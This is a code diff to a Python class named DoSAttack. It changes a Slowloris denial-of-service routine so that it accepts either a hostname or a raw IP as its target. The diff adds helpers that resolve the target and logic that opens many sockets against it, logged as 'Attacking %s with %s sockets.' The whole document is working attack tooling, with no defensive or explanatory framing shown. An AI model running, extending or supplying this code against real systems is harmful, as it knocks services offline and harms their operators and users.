@@ -5,6 +5,7 @@ import logging
 import subprocess
 from urllib.parse import urlparse
 import os
+import re
 
 
 logging.basicConfig(
@@ -38,7 +39,24 @@ class DoSAttack:
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
 
-    def slowloris_attack(self, url, target_port, num_connections=100):
+    def _get_ip(self, url):
+        try:
+            parsed_url = urlparse(url)
+            if not parsed_url.netloc:
+                parsed_url = urlparse('http://' + url)
+            hostname = parsed_url.netloc
+            return socket.gethostbyname(hostname)
+        except Exception as e:
+            return f"Error: {e}"
+
+    def _is_ip(self, address):
+        try:
+            socket.inet_aton(address)
+            return True
+        except socket.error:
+            return False
+        
+    def slowloris_attack(self, target, target_port, num_connections=100):
         def read_user_agents(file_name):
             user_agents = []
             with open(file_name, "r") as file:
@@ -81,9 +99,14 @@ class DoSAttack:
             logging.info("Creating %s new sockets...", diff)
             for _ in range(diff):
                 try:
-                    parsed_url = urlparse(url)
-                    hostname = parsed_url.netloc
-                    s = init_socket(socket.gethostbyname(hostname))
+                    if not self._is_ip(target):
+                        target = self._get_ip(target)
+                        if "Error" in target:
+                            logging.error(f"Invalid target: {target}")
+                            return
+
+                    ip = target
+                    s = init_socket(ip)
                     if not s:
                         continue
                     list_of_sockets.append(s)
@@ -91,9 +114,13 @@ class DoSAttack:
                     logging.debug("Failed to create new socket: %s", e)
                     break
 
-        parsed_url = urlparse(url)
-        hostname = parsed_url.netloc
-        ip = socket.gethostbyname(hostname)
+        if not self._is_ip(target):
+            target = self._get_ip(target)
+            if "Error" in target:
+                logging.error(f"Invalid target: {target}")
+                return
+
+        ip = target
         socket_count = num_connections
         logging.info("Attacking %s with %s sockets.", ip, socket_count)
         for _ in range(socket_count):
